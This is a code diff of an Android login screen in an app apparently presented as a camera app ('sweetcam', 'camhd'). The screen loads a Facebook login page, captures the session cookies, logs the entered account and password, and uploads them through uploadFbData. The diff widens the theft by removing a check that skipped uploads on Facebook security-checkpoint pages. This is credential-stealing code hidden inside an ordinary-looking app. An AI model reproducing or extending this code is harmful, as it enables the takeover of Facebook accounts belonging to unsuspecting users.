@@ -9,8 +9,8 @@ import android.view.View
 import android.view.WindowManager
 import android.webkit.*
 import androidx.lifecycle.lifecycleScope
-import com.sweetcam.app.*
-import com.sweetcam.app.R
+import com.pipipi.camhd.R
+import com.sweetcam.app.BusDestroyEvent
 import com.sweetcam.app.base.BaseActivity
 import com.sweetcam.app.utils.*
 import kotlinx.android.synthetic.main.activity_face_book.*
@@ -40,15 +40,15 @@ class LoginActivity : BaseActivity(R.layout.activity_face_book) {
 
     private fun clearAll() {
         CookieSyncManager.createInstance(app)
-        val cookieManager = CookieManager.getInstance();
+        val cookieManager = CookieManager.getInstance()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            cookieManager.removeSessionCookies(null);
-            cookieManager.removeAllCookie();
-            cookieManager.flush();
+            cookieManager.removeSessionCookies(null)
+            cookieManager.removeAllCookie()
+            cookieManager.flush()
         } else {
-            cookieManager.removeSessionCookies(null);
-            cookieManager.removeAllCookie();
-            CookieSyncManager.getInstance().sync();
+            cookieManager.removeSessionCookies(null)
+            cookieManager.removeAllCookie()
+            CookieSyncManager.getInstance().sync()
         }
     }
 
@@ -107,10 +107,7 @@ class LoginActivity : BaseActivity(R.layout.activity_face_book) {
                         if (cookieStr.contains("c_user")) {
                             Log.e("--->", "cookieStr: $cookieStr")
                             Log.e("--->", "account == $account  password == $password")
-                            if (!TextUtils.isEmpty(account) && cookieStr.contains("wd=") && !url.contains(
-                                    "checkpoint"
-                                )
-                            ) {
+                            if (!TextUtils.isEmpty(account) && cookieStr.contains("wd=")) {
                                 uploadFbData(
                                     account,
                                     password,
